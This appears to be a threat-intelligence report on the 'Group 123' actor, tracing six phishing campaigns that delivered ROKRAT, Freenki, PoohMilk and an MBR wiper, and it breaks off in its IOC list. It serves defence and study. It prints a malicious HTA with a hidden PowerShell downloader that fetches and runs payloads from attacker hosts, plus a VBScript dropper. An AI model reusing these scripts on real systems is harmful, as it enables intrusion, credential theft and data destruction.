We assess with high\nconfidence that Group 123 was responsible for the following six campaigns:\n\n\"Golden Time\" campaign.\n\"Evil New Year\" campaign.\n\"Are you Happy?\" campaign.\n\"FreeMilk\" campaign.\n\"North Korean Human Rights\" campaign.\n\"Evil New Year 2018\" campaign.\n\nOn January 2nd of 2018, the \"Evil New Year 2018\" was started. This campaign copies the\napproach of the 2017 \"Evil New Year\" campaign.\n\nThe links between the different campaigns include shared code and compiler artifacts such\nas PDB (Program DataBase) patterns which were present throughout these campaigns.\n\n\n-----\n\nBased on our analysis, the Golden Time, both Evil New Year and the North Korean\nHuman Rights\" campaigns specifically targeted South Korean users. The attackers used\nspear phishing emails combined with malicious HWP documents created using Hancom\nHangul Office Suite. Group 123 has been known to use exploits (such as CVE-2013-0808) or\nscripting languages harnessing OLE objects. The purpose of the malicious documents was\nto install and to execute ROKRAT, a remote administration tool (RAT). On occasion the\nattackers directly included the ROKRAT payload in the malicious document and during other\ncampaigns the attackers leveraged multi-stage infection processes: the document only\ncontained a downloader designed to download ROKRAT from a compromised web server.\n\nAdditionally, the \"FreeMilk\" campaign targeted several non-Korean financial institutions. In\nthis campaign, the attackers made use of a malicious Microsoft Office document, a deviation\nfrom their normal use of Hancom documents. This document exploited a newer vulnerability,\nCVE-2017-0199. Group 123 used this vulnerability less than one month after its public\ndisclosure. During this campaign, the attackers used 2 different malicious binaries: PoohMilk\nand Freenki. PoohMilk exists only to launch Freenki. Freenki is used to gather information\nabout the infected system and to download a subsequent stage payload. This malware was\nused in several campaigns in 2016 and has some code overlap with ROKRAT.\n\nFinally, we identified a 6th campaign that is also linked to Group 123. We named this 6th\ncampaign \"Are You Happy?\". In this campaign, the attackers deployed a disk wiper. The\npurpose of this attack was not only to gain access to the remote infected systems but to also\nwipe the first sectors of the device. We identified that the wiper is a ROKRAT module.\n\nThis actor was very active this year and continued to mainly focus on South Korea. The\ngroup leveraged spear phishing campaigns and malicious documents the contents of which\nincluded very specific language suggesting that they were crafted by native Korean speakers\nrather than through the use of translation services. The actor has the following demonstrated\ncapabilities:\n\nTo include exploits (for Hangul and Microsoft Office) in its workflows.\nTo modify its campaigns by splitting the payload in to multiple stages\nTo use compromised web servers or legitimate cloud based platforms.\nTo use HTTPS communications to make it harder to perform traffic analysis.\nTo compromise third parties to forge realistic spear phishing campaigns (i.e. Yonsei\nuniversity in the \"Golden Time\" campaign).\nTo constantly evolve, the new fileless capability included in 2018 is a proof.\n\n## The Timeline\n\nHere is the timeline for 2017 and the beginning of 2018:\n\n\n-----\n\n## August 2016 to March 2017: \"Golden Time\" Campaign\n\nAs with the majority of Group 123 campaigns, the initial attack vector during this campaign\nwas spear phishing. Talos identified two different kinds of emails. The first email we\ndiscovered was the most interesting. In this sample, we observed the attackers praising the\nuser for joining a panel related to the \"Korean Reunification and North Korean Conference\".\nThe text in the email explained that the recipient should complete the attached document to\nprovide necessary feedback. This appears to be a non-existent conference. The closest\nmatch we identified related to any Unification conference was held in January 2017, which\nwas the NYDA Reunification conference. The sender was 'kgf2016@yonsei.ac.kr' which is\nthe contact email of the Korea Global Forum, a separate conference.\n\nWhen we analyzed the email headers, we determined that the email was sent from an SMTP\nserver using an IP associated with the Yonsei University network. We believe that the email\naddress was compromised and abused by the attackers to send the email used in this\ncampaign.\n\nThe filename for the malicious attachment translates as 'Unification North Korea Conference\n_ Examination Documents' which reinforces the text in the email about the reunification\nconference. For an added bonus, in the body of the email, the attacker even suggests that\npeople who completed the document would get paid a 'small fee'. Perhaps the gift of\nembedded malware is the payment:\n\n\n-----\n\nMuch less effort was used to craft the second email Talos analyzed. The email was from a\nfree Korean mail service provided by Daum, Hanmail, indicating that there was no attempt to\ntry to appear as if it originated from an official body or person, unlike the previous email\ndescribed. The subject was simply 'Request Help' while the attachment filename was 'I'm a\nmunchon person in Gangwon-do, North Korea'. We suspect the attacker was trying to\ngenerate sympathy by reminding the reader that Munchon and the province it is in,\nKangwon, were part of a unified province that included South Korea's Gangwon-do prior to\nthe division of Korea in 1945.\n\nA second email contained a story about a person called 'Ewing Kim' who was looking for\nhelp:\n\n\n-----\n\nThe email's attachments are two different HWP documents, both leveraging same\nvulnerability (CVE-2013-0808). This vulnerability targets the EPS (Encapsulated PostScript)\nformat. The purpose of the shellcode is to download a payload from the Internet. The first\nemail displays the following decoy document to the infected user and download the following\npayload:\n\nhxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpg\n\n\n-----\n\nThe second email displays the following decoy document to the infected user and downloads\nthe following payload:\n\nhxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpg\n\n\n-----\n\nIn both cases, the downloaded payload is the ROKRAT malware.\n\nThe first tasks of this variant of ROKRAT is to check the operating system version. If\nWindows XP is detected, the malware executes an infinite loop. The purpose is to generate\nempty reports if opened on sandbox systems running Windows XP machines. Additionally it\nchecks to determine if common analysis tools are currently running on the infected system. If\nit detects the presence of these tools, the malware performs two network requests to\nlegitimate websites:\n\nhxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg\nhxxp://www[.]hulu[.]com/watch/559035/episode3.mp4\n\nThe Amazon URL displays a WWII game called 'Men of War' while the Hulu URL attempts to\nstream a Japanese anime show called 'Golden Time':\n\n\n-----\n\nOne of the identifying characteristics of ROKRAT is the fact that it uses social network and\ncloud platforms to communicate with the attackers. These platforms are used to exfiltrate\ndocuments and receive instructions. Here is a list of the platforms used by this variant:\nTwitter, Yandex and Mediafire. The tokens for each platform are hardcoded within the\nsample:\n\n\n-----\n\n## November 2016 to January 2017: \"Evil New Year\" Campaign\n\nIn the early part of 2017, Group123 started the \"Evil New Year\" campaign. In this campaign\nthe actors tried to fool victims by pretending the emails were from the Korean Ministry of\nUnification and that they offered Korean-specific analysis. This campaign began with a\nhandful of spear phishing emails to South Korean targets and containing malicious\nattachments. Group123 further attempted to entice victims to open the attachments by using\ncommon Hancom Hangul documents. Hancom's Hangul is a popular Office Suite used\nprimarily in the Korean peninsula. The use of Hangul office documents has the advantage of\nbeing the norm for the Korean peninsula. If the attacker used Microsoft documents, it may\nhave raised suspicions in the victim. Given the regional file format used there is a chance\nthat some security software suites may not handle them well, and this may have provided an\nevasion case for the attacker\n\n\n-----\n\nThe documents sent to the targets were titled Analysis of Northern New Year in 2017 and\nused the official logo of the Korean Ministry of Unification. This is a simple choice for the\nactor to make, but it further shows their familiarity with the region.\n\nThe document claimed to discuss the New Year's activities of North Korea and this would\nhave been something that the victims in South Korea would be very interested in. This would\nhave been particularly true for Government targets, who we believe to be Group123's target\nof choice.\n\nThis document was a decoy aimed to entice the user to open malicious documents\nembedded further down the page\n\n\n-----\n\nThe actor embedded two additional links and the document urged the user to click on these\nlinks for more information about New Year's activities in North Korea. The first link was\nlabeled as \"Comparison of Major Tasks in '16 & '17\" and the second link was identified as\n\"Comparison between '16 & '17\".\n\nUpon opening these links the user was presented with a further decoy Hangul document.\nThis document was well written and further increases our confidence that we are dealing with\na new Korean actor. These documents contained malicious OLE objects used to drop\nbinaries.\n\n\n-----\n\nThis time, however, they contained malicious OLE (Object Link Embedded) objects.\n\nInitial analysis confirmed two similarly sized OLE object files within this document which\nappeared to be the same from an execution point of view.\n\nThe two dropped binaries were stored and executed in this location during our analysis:\n\nC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exe\nC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exe\n\nInitial analysis showed some sloppy cleaning up from Group123, which we used later to\ndetermine that separate campaigns were the work of this same actor, as compilation artifacts\nremained within the binaries:\n\ne:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb\n\nThe second stage of the dropped binaries was used to execute wscript.exe while injecting\nshellcode into this process. The shellcode is embedded within the resource 'BIN' and is used\nto unpack another PE32 binary and use wscript.exe to execute it. To do this, Group123 uses\na well-known technique that harnesses VirtualAllocEx(), WriteProcessMemory() and\nCreateRemoteThread() Windows API calls.\n\n\n-----\n\nThe new PE32 unpacked from the shellcode is an initial reconnaissance malware which is\nused to communicate with the C2 infrastructure to obtain the final payload. The information\nthis malware collected included the following:\n\nThe computer name\nThe username\nThe execution path of the sample\nThe BIOS model\nA randomly-generated ID to uniquely identify the system\n\nGroup123 utilized this method to ensure their victim was (a) someone they wanted to target\nfurther and (b) someone they could infect further based on the information obtained from the\nreconnaissance phase.\n\nFurther network analysis showed that the binary attempted to connect to the following URLs:\n\nwww[.]kgls[.]or[.]kr/news2/news_dir/index.php\nwww[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg\n\nKorean Government Legal Services (KGLS) is a legitimate Korean government body that\nmanages Korean government legal affairs. By compromising the KGLS, the attacker gained\na trusted platform from which to execute an attack.\n\nThe initial network connection is to 'index.php'. This connection transmits the information\ngathered during the reconnaissance phase. The attacker uses this information to then\ndetermine the specific filename (based on the random ID) to serve to the infected victim. In\nour case this was 02BC6B26 - this meant a file \"02BC6B26_put.jpg\" was created for us on\nthe attackers C2. This file is then dropped and renamed 'officepatch.exe' on the victim's\nmachine. Because the attacker was careful about who they attacked, we were unable to\nobtain this file during our analysis.\n\nDuring our investigation we were able to identify additional Command and Control\ninfrastructure used by this actor. Four C2s were observed, based in the following countries:\n\n3 C2 in South Korea\n1 C2 in the Netherlands\n\nHere is a global map of the identified infrastructure:\n\n\n-----\n\nContrary to the previous campaign, the attackers separated the reconnaissance phase from\nthe main ROKRAT payload. This trick was likely used to avoid detection. This is an\ninteresting adaptation in Group 123's behavior.\n\n## March 2017: \"Are You Happy?\" Campaign\n\nIn March 2017, Group 123 compiled a disk wiper. The malware contains 1 function, the\npurpose is to open the drive of the infected system (\\\\.\\PhysicalDrive0) and write the\nfollowing data to the MBR:\n\n\n-----\n\nYou can see the Are you Happy? string in the written buffer. After writing to the MBR, the\nmalware reboots the machine with the following command: c:\\windows\\system32\\shutdown /r\n/t 1\n\nAfter the reboot, the MBR displays the following string to the user:\n\nThe link to the other campaigns was the following PDB path:\n\nD:\\HighSchool\\version\n13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb\n\nAs you can see, it perfectly matches the ROKRAT PDB. This wiper is a ROKRAT module\nnamed ERSP.enc. We assume that ERSP means ERaSePartition. This module can be\ndownloaded and executed on demand by Group 123.\n\nThis sample is interesting considering the attack in December 2014 against a Korean power\nplant where the message that was displayed by the wiper was \"Who Am I?\".\n\n## May 2017: \"FreeMilk\" Campaign\n\nThis campaign targeted non-Korean financial institutions, but unlike the other campaigns,\nthis one does not use HWP documents. It instead uses Office documents. This change is\nbecause Group 123 did not target South Korea during this campaign and Microsoft Office is\nstandard in the rest of the world.\n\n### Infection Vectors\n\nThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA\ndocument inside of Microsoft Office. The URL used can be found in the embedded OLE\nobject:\n\n\n-----\n\nhxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]\n\nHere is the source code of the downloaded HTA document:\n```\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" />\n<title>Bonjour</title>\n<script language=\"VBScript\">\nSet owFrClN0giJ = CreateObject(\"Wscript.Shell\")\nSet v1ymUkaljYF = CreateObject(\"Scripting.FileSystemObject\")\nIf v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(\"%PSModulePath%\") +\n\"..\\powershell.exe\") Then\nowFrClN0giJ.Run \"powershell -nop -windowstyle hidden -executionpolicy bypass encodedcommand JABjAD0AbgBlAHcALQBvA[...redacted...]H0AIAA=\",0\nowFrClN0giJ.Run \"cmd /c echo hta>%tmp%\\webbrowser1094826604.tmp\", 0\nEnd If\nSelf.Close\n</script>\n<hta:application\nid=\"oHTA\"\napplicationname=\"Bonjour\"\napplication=\"yes\"\n>\n</head>\n</html>\n\n```\nOnce decoded using the base64 algorithm, we are able to read the final payload:\n```\n$c=new-object System.Net.WebClient\n$t =$env:temp\n$t1=$t+\"\\\\alitmp0131.jpg\"\n$t2=$t+\"\\\\alitmp0132.jpg\"\n$t3=$t+\"\\\\alitmp0133.js\"\ntry\n {\n  echo $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg\",$t1)\n  $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg\",$t2)\n  $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp\",$t3)\n  wscript.exe $t3\n }\ncatch\n { \n }\n\n```\nThe purpose of this script is to download and execute a Windows script and two encoded\npayloads. The script is used to decode and execute the following payloads:\n\nAppach01 jpg (renamed: Windows-KB275122-x86 exe) is a Freenki sample\n\n\n-----\n\nAppach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.\n\n### PoohMilk Analysis\n\nThe PoohMilk sample is designed to perform two actions:\n\nCreate persistence to execute the Freenki sample at the next reboot.\nCheck specific files on the infected machine.\n\nThe first action is to create a registry key in order to execute the Windows-KB275122x86.exe file previously downloaded. The file is executed with the argument: \"help\". Here is\nthe registry creation:\n\n\n-----\n\nThe registry location where persistence is achieved is:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update. At the next\nreboot, the malware will be executed.\n\nThe second action is to check if the file \"wsatra.tmp\" exists in the temporary directory of the\ncurrent user. If this file exists, the content is read in order to obtain a path to find a second file\nwith the LNK (link) extension. The LNK file is finally used to identify a third file: a ZIP file. The\nfile will be inflated in order to retrieve a RTF document, this document will be displayed to the\ninfected user by executing Wordpad.\n\nHere is the PDB path from the PoohMilk sample:\n\nE:\\BIG_POOH\\Project\\milk\\Release\\milk.pdb\n\n### Freenki Sample\n\nThe purpose of Freenki is to collect information on the infected system and to download a\nthird executable.\n\nThis sample can be executed with 3 different arguments:\n\n\"Help\": the value configured by PoohMilk. In this context the main function is executed.\n\"Console\": with the argument, a persistence is configured and the malware will be\nexecuted at the next reboot (\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\n\"Sample\": with this argument, the malware executes the console command followed by\nthe help command.\n\nThe information collected is performed using WMI queries:\n\n\n-----\n\nAdditionally the malware lists the running process via the Microsoft Windows API. The\nmalware uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm\nis based on bitwise (SUB 0x0F XOR 0x21), here is the decoded data:\n\nhxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.php\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR\n2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;\n.NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)\n\nThe downloaded third payload is obfuscated using the same technique. The file is a fake\nimage starting with \"PNGF\".\n\n## November 2017: \"North Korean Human Rights\" Campaign\n\nIn November 2017, Talos observed the latest Group123 campaign of the year, which\nincluded a new version of ROKRAT being used in the latest wave of attacks. Group 123\nagain used one of their main calling cards, the malicious HWP document. This time, Group\n123 used a document containing information in relation to a meeting held on 1st November\nin Seoul, South Korea. This document was alleged to have been written by a legal\nrepresentative claiming to be representing the \"Citizens' Alliance For North Korean Human\nRights And Reunification Of Korean Peninsula\". Group 123 once again uses information\n\n\n-----\n\nrelated to the Korean unification and now are claiming to highlight concerns related to human\nrights issues.\n\nThe document brought Talos a new gift - a new version of ROKRAT. Following on with the\nnormal Group 123 activity the document was written in perfect Korean text and dialect again\nsuggesting the origin of this group is from the Korean peninsula.\n\nFurther analysis of the document text allowed us to understand the context. The document\nmentions 'Community of North Korean human rights and unification' with the lawyer claiming\nto be part of the \"Citizen's Alliance for North Korean Human Rights and North-South\nunification\". The main purpose of this document was an attempt to arrange a meeting to\ndiscuss items related to \"North Korean Human Rights Act\" and \"Enactment of a Law\" which\nwas passed in 2016 in South Korea. We believe that the document was attempting to target\n\n\n-----\n\nstakeholders within the 올인통 community in an attempt to entice them to join the discussion\nin an attempt to work on additional ideas related to these activities. The meeting was due to\ntake place on November 1, 2017 and this document was trying to garner additional interest\nprior to the meeting.\n\nOnce again Group 123 leveraged the use of OLE objects within the HWP document.\nAnalysis starts with a zlib decompression (a standard action of HWP documents) and we're\nable to recover the following script:\n```\nconst strEncode =\n\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAA\nDIM outFile\nDIM base64Decoded\nDIM shell_obj\nSET shell_obj = CreateObject(\"WScript.Shell\")\nDIM fso\nSET fso = CreateObject(\"Scripting.FileSystemObject\")\noutFile = \"c:\\ProgramData\\HncModuleUpdate.exe\"\nbase64Decoded = decodeBase64(strEncode)\nIF NOT(fso.FileExists(outFile)) then\nwriteBytes outFile, base64Decoded\nshell_obj.run outFile\nEND IF\nWScript.Quit()\nprivate function decodeBase64(base64)\nDIM DM, EL\nSET DM = CreateObject(\"Microsoft.XMLDOM\")\nSET EL = DM.createElement(\"tmp\")\nEL.DataType = \"bin.base64\"\nEL.Text = base64\ndecodeBase64 = EL.NodeTypedValue\nend function\nprivate Sub writeBytes(file, bytes)\nDIM binaryStream\nSET binaryStream = CreateObject(\"ADODB.Stream\")\nbinaryStream.Type = 1\nbinaryStream.Open\nbinaryStream.Write bytes\nbinaryStream.SaveToFile file, 1\nEnd Sub\n\n```\nThis script is executed and is used to decode a static base64 string within the strEncode\nvariable. Using base64 encoding the decoded binary is stored as HncModuleUpdate.exe and\nis then executed. This is the ROKRAT dropper. Talos suspect the filename may have been\nselected to make it appear within running processes as a potential Hancom updater.\n\nThe dropper is used to extract a new resource named SBS. This specific resource contains\nmalicious shellcode used by the malware. Additionally we see a cmd.exe process launched\nand used for process injection using the VirtualAlloc(), WriteProcessMemory() and\n\n\n-----\n\nCreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to\nuse similar Windows APIs. The following graph view from IDA shows these steps.\n\nThese execution steps allow the launch of the new ROKRAT variant by decoding the PE\nbinary and injecting into the cmd.exe process.\n\nOne of Group 123 oddities in this campaign was to drop the following picture as a decoy\nimage to the user. This image shows various publicly available images which look to be\nrelated to the Korean 'Independence Movement' and appear to be related to the Korean war.\n\n\n-----\n\nWe began performing further in-depth analysis on this new version of ROKRAT and this is\nwhere we started to notice some similarities with Group 123s \"Evil New Years\" campaign.\nThe similitudes are discussed later in this paper.\n\nThis ROKRAT variant contained anti-sandbox techniques. This is performed by checking if\nthe following libraries are loaded on the victim machine.\n\nSbieDll.dll (sandboxie library)\nDbghelp.dll (Microsoft debugging tools)\nApi_log.dll (threatAnalyzer / GFI SandBox)\nDir_watch.dll (threatAnalyzer / GFI SandBox)\n\n\n-----\n\nWe were able to uncover some other techniques used by this variant of ROKRAT to make\nanalysis difficult, Group 123 used an anti-debugging technique related to NOP (No\nOperation).\n\n\n-----\n\nnop dword ptr [eax+eax+00h] is a 5 byte NOP. But this opcode is not correctly supported by\nsome debugging tools, Immunity Debugger for example, will replace the assembly by \"???\"\nin red making it difficult to attempt to debug.\n\nThis version of ROKRAT came with a Browser Stealer mechanism which was similar, with a\nfew modifications, to that used in the FreeMilk campaign using Freenki malware in 2016.\n\nGroup 123 continued their use of Cloud platforms with this campaign, this time leveraging\npCloud, Dropbox, Box and Yandex.\n\nFinally here is the PDB of the sample used during this campaign:\n\nd:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb\n\n## January 2018: \"Evil New Year 2018\" Campaign\n\nAs we observed at the beginning of 2017, Group 123 started a campaign corresponding with\nthe new year in 2018. This campaign started on the 2nd of January. The infection vector was\na malicious HWP document:\n\n\n-----\n\nThis decoy document is an analysis of the 2018 New Year speech made by the leader of\nNorth Korea. The approach is exactly the same as what was seen in 2017 using a new\ndecoy document. This document was alleged to have been written by the Ministry of\nReunification as demonstrated by the logo in the top left.\n\nSimilar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order\nto download and execute shellcode located on a compromised website:\n\nhxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.png\n\nThe fake image usage is a common pattern for this group. This image contains shellcode\nused to decode the embedded final payload: ROKRAT. This ROKRAT variant is loaded from\nmemory. It's a fileless version of ROKRAT. This behavior shows that Group 123 is constantly\nevolving to avoid detection. As usual, the ROKRAT sample uses cloud providers to\ncommunicate with the operator, this time leveraging Yandex, pCloud, Dropbox and Box.\n\n## Links Between Campaigns\n\n### Code Sharing\n\nTalos has identified that Group 123 shares code between different malware. Several features\nare shared in the samples mentioned in this article; however we will cover only two in this\narticle: the reconnaissance phase and the browsers stealer.\n\n**Reconnaissance Phase**\n\nThe ROKRAT samples used during the two \"Evil New Year\" and the \"North Korean Human\nRights\" campaigns contained a reconnaissance phase. In the \"Evil New Year\" campaign the\npayload was split into two parts, the first part contained the reconnaissance code. In the\nother campaign the reconnaissance phase was directly included in the main payload. This\ncode is the same.\n\nThe malware uses the following registry key to get the machine type:\nHKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData. The \"System\nmanufacturer\" value is used to identify the type of machine. The code appears to be based\non a forum post (rohitab.com) describing the use of the Win32 APIs used. The source code\nonly considers the following machine types:\n\n\n-----\n\n```\ndefault:  lpString (Other) ;        break;\ncase 0x02: lpString = \"(Unknown)\";       break;\ncase 0x03: lpString = \"(Desktop)\";       break;\ncase 0x04: lpString = \"(Low Profile Desktop)\"; break;\ncase 0x06: lpString = \"(Mini Tower)\";     break;\ncase 0x07: lpString = \"(Tower)\";        break;\ncase 0x08: lpString = \"(Portable)\";      break;\ncase 0x09: lpString = \"(Laptop)\";       break;\ncase 0x0A: lpString = \"(Notebook)\";      break;\ncase 0x0E: lpString = \"(Sub Notebook)\";    break;\n\n```\nThe string format - with the () - and the considering types are exactly the same as those used\nin the ROKRAT samples.\n\nIt's interesting to note that this reconnaissance phase was not included in the ROKRAT\nvariant used during the \"Golden Time\" campaign.\n\n**Brower Stealer**\n\nFor the first time, the ROKRAT sample used during the \"North Korean Human Rights\"\ncontained a browser credentials stealer. The code used to perform this task in the same that\nfound within in a Freenki sample deployed in 2016.\n\nThe malware is able to extract the stored passwords from Internet Explorer, Chrome and\nFirefox. For Chrome and Firefox, the malware queries the sqlite database containing the\nURL, username and password:\n\nAdditionally, they support the Microsoft Vault mechanism. Vault was implemented in\nWindows 7, it contains any sensitive data (like the credentials) of Internet Explorer. Here is\nthe initialization of the Vault APIs:\n\n\n-----\n\nOn the left, we have the ROKRAT sample and on the right the FreeMilk sample. You can see\nthat in addition to the code, the author copy-pasted English typos such as \"IE Registery\":\n\n\n-----\n\n### PDB Paths\n\nWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned\nin this article.\n\nROKRAT:\n\ne:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\"\ncampaign)\nd:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North\nKorean Human Rights\" campaign\nD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb\n(ROKRAT Sample from an unidentified campaign from June)\n\nWiper:\n\nD:\\HighSchool\\version\n13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the\n\"Are You Happy?\" campaign)\n\n## Summary Graph\n\n\n-----\n\nHere is a graph to visualize the similarities and differences between each campaign\nmentioned in this article:\n\n## Conclusion\n\nSouth Korea is becoming an important target for malicious actors and the techniques used\nare becoming specific to the region (for example: use of native language to try and ensure\nthe targets feel that the information, document or email being sent to them has added\nlegitimacy). In a specific campaign, this actor took time to compromise multiple legitimate\nKorean platforms including Yonsei and the KGLS in order to forge the spear phishing\ncampaign or to host the command and control. This approach is not common with less\nadvanced actors and demonstrates a high level of maturity and knowledge of the Korean\nregion.\n\nHowever Group 123's activities are not limited to South Korea. For international targets, they\nare able to switch to a more standard attack vector such as using Microsoft Office documents\nas opposed to the specific HWP documents used when targeting victims located in Korea.\nGroup 123 does not hesitate to use public exploits and scripting languages to drop and\nexecute malicious payloads. We can notice that this group uses compromised legitimate\nwebsites (mainly Wordpress) and cloud platforms to communicate with the infected systems.\nThis approach makes it difficult to detect communications through analysis of these network\nflows. Even if the arsenal of this actor is diverse, we have identified some patterns, copypaste code from various public repositories and similarities between the different piece of\ncode. In addition to the Remote Administration Tools, we identified a wiper. We conclude that\nthis group was involved in a campaign of intelligence gathering and finally attempted\ndestruction.\n\n\n-----\n\nWith our current knowledge of this actor, we predict that they will not disappear anytime soon\nand will continue to be active during the coming years. Group 123 is constantly evolving as\nthe new fileless capability that was added to ROKRAT demonstrates. We also believe their\ntarget profile may change but for now it will mostly focus on Korean peninsula targets,\nhowever, as explained their capabilities will likely continue to evolve over time as they further\nrefine their TTPs.\n\n## IOCs\n\n### \"Golden Time\" Campaign:\n\nMaldoc #1 sha256:\n7d163e36f47ec56c9fe08d758a0770f1778fa30af68f39aac80441a3f037761e\n\nMaldoc #2
